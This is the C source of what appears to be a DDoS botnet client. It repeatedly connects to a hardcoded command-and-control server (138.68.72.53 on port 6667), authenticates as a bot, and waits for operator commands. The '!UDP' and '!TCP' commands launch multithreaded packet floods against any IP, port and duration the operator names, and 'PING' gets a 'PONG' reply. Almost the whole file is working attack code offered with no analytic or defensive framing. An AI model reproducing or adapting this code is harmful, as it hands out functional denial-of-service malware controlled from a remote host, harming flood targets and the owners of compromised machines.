#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define C2_ADDRESS "138.68.72.53"
#define C2_PORT 6667

// UDP Flood
void *attack_udp(void *arg) {
    char **argv = (char **)arg;
    char *ip = argv[0];
    int port = atoi(argv[1]);
    int secs = atoi(argv[2]);
    int size = atoi(argv[3]);
    time_t end = time(0) + secs;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);
    char *data = malloc(size);
    memset(data, 0x41, size);
    while(time(0) < end) {
        sendto(sock, data, size, 0, (struct sockaddr *)&addr, sizeof(addr));
    }
    free(data);
    close(sock);
    pthread_exit(NULL);
}

// TCP Flood
void *attack_tcp(void *arg) {
    char **argv = (char **)arg;
    char *ip = argv[0];
    int port = atoi(argv[1]);
    int secs = atoi(argv[2]);
    int size = atoi(argv[3]);
    time_t end = time(0) + secs;
    char *data = malloc(size);
    memset(data, 0x41, size);
    while(time(0) < end) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        addr.sin_addr.s_addr = inet_addr(ip);
        if(connect(sock, (struct sockaddr*)&addr, sizeof(addr))==0){
            send(sock, data, size, 0);
        }
        close(sock);
    }
    free(data);
    pthread_exit(NULL);
}

// Verbindung zum C2 herstellen und Kommandos parsen
int main() {
    int sockfd;
    struct sockaddr_in serv_addr;
    char buffer[1024];
    char sendbuf[64];
    pthread_t threads[16];

    while(1) {
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(C2_PORT);
        serv_addr.sin_addr.s_addr = inet_addr(C2_ADDRESS);

        if(connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr))<0) {
            sleep(5);
            continue;
        }

        // Anmeldung
        send(sockfd, "669787761736865726500", 21, 0);
        recv(sockfd, buffer, sizeof(buffer), 0);
        send(sockfd, "BOT", 3, 0);
        recv(sockfd, buffer, sizeof(buffer), 0);
        send(sockfd, "\xff\xff\xff\xff\75", 5, 0);

        while(1) {
            memset(buffer, 0, sizeof(buffer));
            int n = recv(sockfd, buffer, sizeof(buffer)-1, 0);
            if(n <= 0) break;
            buffer[n] = 0;
            char *cmd = strtok(buffer, " \n");

            if(cmd && strcmp(cmd, "!UDP") == 0) {
                char *ip = strtok(NULL, " \n");
                char *port = strtok(NULL, " \n");
                char *secs = strtok(NULL, " \n");
                char *size = strtok(NULL, " \n");
                char *threads_cnt = strtok(NULL, " \n");
                int tcnt = threads_cnt ? atoi(threads_cnt) : 1;
                for(int i=0;i<tcnt && i<16;i++) {
                    char **params = malloc(4 * sizeof(char*));
                    params[0]=strdup(ip); params[1]=strdup(port); params[2]=strdup(secs); params[3]=strdup(size);
                    pthread_create(&threads[i], NULL, attack_udp, params);
                }
            }
            else if(cmd && strcmp(cmd, "!TCP") == 0) {
                char *ip = strtok(NULL, " \n");
                char *port = strtok(NULL, " \n");
                char *secs = strtok(NULL, " \n");
                char *size = strtok(NULL, " \n");
                char *threads_cnt = strtok(NULL, " \n");
                int tcnt = threads_cnt ? atoi(threads_cnt) : 1;
                for(int i=0;i<tcnt && i<16;i++) {
                    char **params = malloc(4 * sizeof(char*));
                    params[0]=strdup(ip); params[1]=strdup(port); params[2]=strdup(secs); params[3]=strdup(size);
                    pthread_create(&threads[i], NULL, attack_tcp, params);
                }
            }
            else if(cmd && strcmp(cmd, "PING") == 0) {
                send(sockfd, "PONG", 4, 0);
            }
        }
        close(sockfd);
        sleep(5);
    }
    return 0;
}